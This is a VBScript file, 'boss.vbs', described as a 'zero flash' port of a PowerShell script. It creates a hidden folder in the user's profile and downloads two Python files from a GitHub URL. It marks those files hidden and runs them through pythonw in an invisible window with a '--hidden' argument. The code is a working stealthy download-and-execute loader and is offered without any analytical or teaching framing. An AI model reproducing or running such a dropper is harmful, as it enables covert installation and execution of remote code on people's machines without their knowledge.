Option Explicit

' ============================================================
' boss.vbs - Exact port of pp.ps1 with ABSOLUTE ZERO FLASH
' ============================================================

Dim sh, fso, userProfile, configPath, clientPath, autoPath
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Resolve paths
userProfile = sh.ExpandEnvironmentStrings("%USERPROFILE%")
If userProfile = "%USERPROFILE%" Or userProfile = "" Then WScript.Quit 1

configPath = fso.BuildPath(userProfile, ".configs")
clientPath = fso.BuildPath(configPath, "client.py")
autoPath   = fso.BuildPath(configPath, "auto.py")

' ---- 1. Create config directory silently ----
On Error Resume Next
If Not fso.FolderExists(configPath) Then
    fso.CreateFolder configPath
End If
If Err.Number <> 0 Then WScript.Quit 1
Err.Clear

' ---- 2. Hide the directory ----
Dim folder
Set folder = fso.GetFolder(configPath)
If Err.Number = 0 Then
    folder.Attributes = folder.Attributes Or 2 ' 2 = Hidden
    Err.Clear
End If

' ---- 3. Download both files ----
If Not DownloadFile("https://raw.githubusercontent.com/boss-defender/export/main/client.py", clientPath) Then WScript.Quit 1
If Not DownloadFile("https://raw.githubusercontent.com/boss-defender/export/main/auto.py", autoPath) Then WScript.Quit 1

' ---- 4. Locate Python (Force pythonw.exe or pyw.exe) ----
Dim launcher, cmd
launcher = FindLauncher()

If launcher = "" Then
    MsgBox "Python is not installed or could not be found.", 16, "Error"
    WScript.Quit 1
End If

' Build the command string
If InStr(LCase(launcher), "pythonw.exe") > 0 Then
    ' pythonw.exe does NOT accept the -3 argument
    cmd = """" & launcher & """ -u """ & autoPath & """ """ & clientPath & """ --hidden"
Else
    ' pyw.exe accepts the -3 argument
    cmd = """" & launcher & """ -3 -u """ & autoPath & """ """ & clientPath & """ --hidden"
End If

' ---- 5. Launch with WScript.Shell (User Context, No Flash) ----
sh.CurrentDirectory = configPath
sh.Run cmd, 0, False
WScript.Quit 0

' ============================================================
' Function: FindLauncher (Searches for GUI versions of Python)
' ============================================================
Function FindLauncher()
    Dim env, dirs, i, testPath, versions, v
    FindLauncher = ""
    
    ' 1. Search PATH for pythonw.exe and pyw.exe
    env = sh.ExpandEnvironmentStrings("%PATH%")
    dirs = Split(env, ";")
    For i = 0 To UBound(dirs)
        If Len(Trim(dirs(i))) > 0 Then
            testPath = fso.BuildPath(Trim(dirs(i)), "pythonw.exe")
            If fso.FileExists(testPath) Then FindLauncher = testPath : Exit Function
            testPath = fso.BuildPath(Trim(dirs(i)), "pyw.exe")
            If fso.FileExists(testPath) Then FindLauncher = testPath : Exit Function
        End If
    Next

    ' 2. Search WindowsApps (Microsoft Store Python)
    testPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%\Microsoft\WindowsApps\pythonw.exe")
    If fso.FileExists(testPath) Then FindLauncher = testPath : Exit Function
    testPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%\Microsoft\WindowsApps\pyw.exe")
    If fso.FileExists(testPath) Then FindLauncher = testPath : Exit Function

    ' 3. Search standard AppData installs (Python 3.8 - 3.13)
    versions = Array("313", "312", "311", "310", "39", "38")
    For Each v In versions
        testPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%\Programs\Python\Python" & v & "\pythonw.exe")
        If fso.FileExists(testPath) Then FindLauncher = testPath : Exit Function
    Next

    ' 4. Last resort: standard py.exe (this WILL flash briefly)
    For i = 0 To UBound(dirs)
        If Len(Trim(dirs(i))) > 0 Then
            testPath = fso.BuildPath(Trim(dirs(i)), "py.exe")
            If fso.FileExists(testPath) Then FindLauncher = testPath : Exit Function
        End If
    Next
End Function

' ============================================================
' Function: DownloadFile
' ============================================================
Function DownloadFile(url, target)
    DownloadFile = False
    Dim http, stream, tempFile, f
    tempFile = target & ".download"
    
    On Error Resume Next
    If fso.FileExists(tempFile) Then fso.DeleteFile tempFile, True
    Err.Clear
    
    If fso.FileExists(target) Then
        fso.GetFile(target).Attributes = 0
        Err.Clear
    End If

    Set http = CreateObject("MSXML2.XMLHTTP.6.0")
    If Err.Number <> 0 Then
        Err.Clear
        Set http = CreateObject("MSXML2.XMLHTTP")
    End If
    If Err.Number <> 0 Then Exit Function
    
    http.Open "GET", url, False
    http.Send
    
    If Err.Number <> 0 Or http.Status <> 200 Then
        Err.Clear
        If fso.FileExists(tempFile) Then fso.DeleteFile tempFile, True
        Exit Function
    End If

    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write http.ResponseBody
    stream.SaveToFile tempFile, 2
    
    If Err.Number <> 0 Then
        Err.Clear
        If fso.FileExists(tempFile) Then fso.DeleteFile tempFile, True
        Exit Function
    End If
    stream.Close

    If Not fso.FileExists(tempFile) Then Exit Function
    If fso.GetFile(tempFile).Size <= 0 Then
        fso.DeleteFile tempFile, True
        Exit Function
    End If

    fso.MoveFile tempFile, target
    If Err.Number <> 0 Then Exit Function

    Set f = fso.GetFile(target)
    f.Attributes = f.Attributes Or 2 
    
    DownloadFile = True
    On Error GoTo 0
End Function
